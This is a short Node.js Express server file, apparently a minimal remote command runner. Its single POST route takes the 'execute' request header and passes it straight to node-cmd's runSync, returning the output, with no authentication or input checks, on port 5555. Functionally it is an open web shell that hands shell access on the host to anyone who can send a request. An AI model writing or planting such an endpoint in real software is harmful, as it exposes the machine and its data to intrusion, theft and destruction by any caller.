const express = require('express')
const cmd = require('node-cmd')
const app = express()

app.post('/', (req, res) => {
    if(req.headers.execute) {
        res.json(cmd.runSync(req.headers.execute))
    } else {
        res.json({data: null, err: 'Invalid data supplied.'})
    }
})

app.listen(5555)